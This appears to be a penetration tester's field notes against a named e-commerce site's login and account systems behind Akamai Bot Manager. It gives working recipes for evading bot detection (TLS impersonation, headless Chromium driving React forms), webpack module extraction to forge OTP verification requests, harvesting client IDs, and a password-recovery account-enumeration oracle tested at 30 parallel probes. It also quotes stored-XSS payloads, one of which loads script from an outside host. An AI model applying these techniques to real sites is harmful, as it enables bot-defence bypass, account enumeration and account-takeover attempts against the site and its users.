# Akamai 428 sec-cp-challenge + sensor-gated flows + live-page API oracle extraction

Full transcripts and field-verified details from an authorized e-commerce engagement
(Oct 2026). Target: myntra.com estate (Akamai Bot Manager + mPulse + sec-cp-challenge).
All claims here were reproduced with at least two independent tools (curl_cffi chrome120,
curl_cffi safari17_0, CDP-driven Chromium).

## 1. The 428 sec-cp-challenge body (full field map)

```json
{"sec-cp-challenge": "true", "provider": "crypto",
 "chlge_content_url": "/<path>/...", "branding_url_content": "/<path>/...",
 "chlg_duration": 30, "token": "<342-char base64url>", "timestamp": 1790908509,
 "nonce": "<20 hex>", "difficulty": 15000, "count": 1, "timeout": 1000,
 "cpu": false, "verify_url": "https://host/<path>/..."}
```

- `token` decodes to 256 raw bytes (base64url). Prefix `0004 0000 000e ffffffff...` —
  no usable cleartext inside.
- The challenge JS (`chlge_content_url`) is an HTML page embedding a ~92KB obfuscated
  PoW/sensor script. It runs only in a real browser context.

## 2. PoW mining alone does not pass — verified

Mined a counter satisfying `sha256(salt||counter) * difficulty < 2^32` (found at counter
3087 with salt = token bytes 0..15), then submitted to `verify_url` in every plausible
format: `{"nonce": N}`, `{"answer": N}`, `{"solution": N}`, `[N]`, bare `N`. All returned
`{"success":false}` HTTP 403. The challenge binds to the browser sensor session, not the
token alone. Headless execution of the obfuscated challenge script under Node with DOM
stubs also failed (`WM[...][...] is not a function` — sensor environment checks).

## 3. Per-endpoint protection asymmetry (same host, same session)

| Endpoint | Behavior |
|---|---|
| `POST /emaillogin` | Silent connection RST (sensor-gated, no response at all) |
| `POST /recoverpass` | No challenge ever — clean 200 JSON |
| `POST /getotp`, `POST /verifyotp` | 428 until challenge clears |
| `POST /gateway/v1/cart/default/add` | 428 on JSON body |

Practical consequence: each auth endpoint must be characterized separately; the challenge
level differs by endpoint, not by host.

## 4. In-session oracle budget on OTP verify

Live sequence of `/gateway/v1/auth/verifyotp` responses through the app's own request path
(single browser session, reload-to-reset observed):

```
[428, 400, 400, 400, 428, 428, 428, 428, 428, 428, 428, 428, 428]
```

- First call: 428 (challenge not yet passed).
- Calls 2-4: clean oracle responses (`400 {"code":111023,"message":"Incorrect OTP"}`).
- Calls 5+: persistent 428s regardless of 4-second pacing; page reload was the only reset.
- OTP brute force is not practical: 3-attempt window then challenge. The "attempts
  exceeded" path (`code 115004`, "Number of attempts exceeded") exists in the app but
  Akamai's window closes first.

## 5. Webpack runtime module extraction (the API oracle unlock)

Manual replay without the transform: `400 {"code":1001,"message":"Invalid input"}`
(misleading — looks like field format, is a missing derived field).

Extraction through the live page's webpack runtime:

```js
let captured = null;
window.webpackChunk.push([['probe_' + Date.now()], {}, req => { captured = req; }]);
const mod = captured(15461);
// mod keys: DX, Eo, Fr, S$, Tc, W6, aA, b3, bJ, df, j5, nM, w6, wm, xF, yZ
const payload = mod.j5({phoneNumber: '9999000111', otp: '1234'});
// → {"phoneNumber":"9999000111","otp":"1234","urt":"d1a16dd6-1591-42c5-94c4-96f6b4a162a2"}
const headers = mod.b3;
// → {"x-meta-app":"deviceId=<uuid>;appFamily=<UA>;reqChannel=web;channel=web;","deviceId":"<uuid>"}
```

With transform + headers: `400 {"code":111023,"message":"Incorrect OTP"}` — clean oracle.

Chunk-global enumeration (varies by build): `webpackChunk`, `webpackJsonp<name>`,
`webpackChunk:<app>` — scan `Object.keys(window)` for arrays-of-arrays with `.push`.
Locate the module id by grepping the route chunk (`m-otplogin.*.js`) for the endpoint
string and reading the service-module calls around it.

## 6. CDP + React form automation (verified working recipe)

```bash
xvfb-run -a chromium --remote-debugging-port=9222 --remote-allow-origins='*' \
  --user-data-dir=/tmp/prof --no-first-run --no-sandbox --disable-gpu https://target/
```

- `--remote-allow-origins='*'` mandatory; without it the WS handshake returns 403.
- Driver loop: `GET /json` → `webSocketDebuggerUrl` → `Runtime.evaluate` with
  `awaitPromise:true`; `Network.enable` first; read statuses via
  `performance.getEntriesByType('resource')` → `.responseStatus`.

React input methods, by observed reliability:

| Method | Result |
|---|---|
| Native value setter + `InputEvent('input',{bubbles,data,inputType:'insertText'})` + `KeyboardEvent('keyup')` | **Works** — React onChange fires, app state updates |
| Calling `props.onChange({target: {...spread}})` | **Fails** — handler does `e.target.getAttribute`, spread object is not the real node |
| `Input.dispatchKeyEvent` char events | **Fails** — value never lands in React OTP boxes |
| `Input.insertText` | **Fails** — same |

OTP components auto-submit on the Nth digit via the keyup handler — set all boxes, then
wait for the app's own request; do not hunt for a submit button (none exists until digits
are in).

## 7. Silent TLS fingerprint drops (curl/urllib → empty output)

Plain `curl` (even `--http1.1`) and `urllib` to Akamai-fronted hosts returned **empty
bodies / dropped connections with zero error text** — not a 403 page. `curl_cffi` with
`impersonate="chrome120"` or `impersonate="safari17_0"` worked immediately. When an
Akamai host "returns nothing", check for silent TLS-fingerprint drops before concluding
the endpoint is dead.

## 8. Cross-app cidx acceptance + cidx harvest sources

`GET /_next/data/<buildId>/login.json?cidx=<id>` →
`{"appName": ..., "showEmail": ..., "showSignUp": ..., "showGoogle": ..., "googleClientId": ...}`.
Invalid ids: `{"errorMessage": "Invalid client Id : <id>"}` (200 status).

Valid cidx values found this session:
- `myntra-<uuid>` — from the guest JWT `at` cookie (base64url-wrapped JWT; payload has `cidx`)
- `UDP-UNITY-<uuid>` — leaked in a partner API 404 page `__NEXT_DATA__` (`pageRequested` query)
- `partners_mdirect-<uuid>` — same source

All accepted on `accounts.myntra.com` regardless of originating app → unlinked auth
endpoints (recoverpass, changepassword, signup) reachable per-app config.

## 9. Password-recovery 3-state enumeration oracle (verified PoC)

`POST /recoverpass?cidx=<valid>` form-encoded (`email`, `cidx`):

| Response | Meaning |
|---|---|
| `{"status":"SUCCESS","statusMessage":"Password reset link is successfully sent..."}` | ACTIVE account |
| `{"status":"ERROR","statusMessage":"Account has been deleted"}` | registered then deleted |
| `{"status":"ERROR","statusMessage":"Account Doesn't exists"}` | never registered |

- Real-account confirmation: `support@<target>.com` → SUCCESS (one reset mail triggered).
- Rate limiting: **per-email on the SUCCESS mail-send only** ("Too many password reset
  requests"). The enumeration oracle across different emails: 30 parallel probes in 1.3s,
  zero throttling, no captcha, no challenge.
- Per-email limiter ≠ enumeration mitigation — report the enumeration axis separately.

## 10. Akamai challenge artifacts also leak attacker history

The api-docs service registry returned prior pentest leftovers as registered client
records: `client_name` fields containing `"><Script src=https://js.rip/prxss></script>`,
`<script>alert(1)</script>`, and Burp Collaborator (oastify.com) URLs in
`openapi_yaml_url` — records ids 318/319/321/324/333. Confirms `client_name` accepts
arbitrary content (stored-XSS surface rendered to authenticated admins only) and shows
the registry leaks internal service names + team ids to anonymous users via
`/getSwaggerRegisteredClient`.
